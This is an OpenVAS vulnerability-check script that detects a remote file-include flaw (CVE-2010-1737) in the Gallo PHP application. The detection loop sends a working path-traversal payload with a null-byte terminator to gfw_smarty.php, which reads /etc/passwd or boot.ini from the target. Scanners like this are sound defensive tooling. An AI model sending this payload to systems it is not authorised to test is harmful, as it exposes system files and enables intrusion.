###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_gallo_39890.nasl 14 2013-10-27 12:33:37Z jan $
#
# Gallo 'gfw_smarty.php' Remote File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Gallo is prone to a remote file-include vulnerability because it fails
to properly sanitize user-supplied input.

An attacker can exploit this issue to include an arbitrary remote file
containing malicious PHP code and execute it in the context of the
webserver process. This may facilitate a compromise of the application
and the underlying system; other attacks are also possible.

Gallo 0.1.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100628);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-05-06 13:19:12 +0200 (Thu, 06 May 2010)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2010-1737");
 script_bugtraq_id(39890);

 script_name("Gallo 'gfw_smarty.php' Remote File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39890");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/gallo/");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if Gallo is prone to a remote file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/gallo",cgi_dirs());
files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach dir (dirs) {
  foreach file (keys(files)) {

    url = string(dir,"/core/includes/gfw_smarty.php?config[gfwroot]=../../../../../../../../../",files[file],"%00");

    if(http_vuln_check(port:port, url:url,pattern:file)) {

      security_hole(port:port);
      exit(0);

    }
  }
}

exit(0);
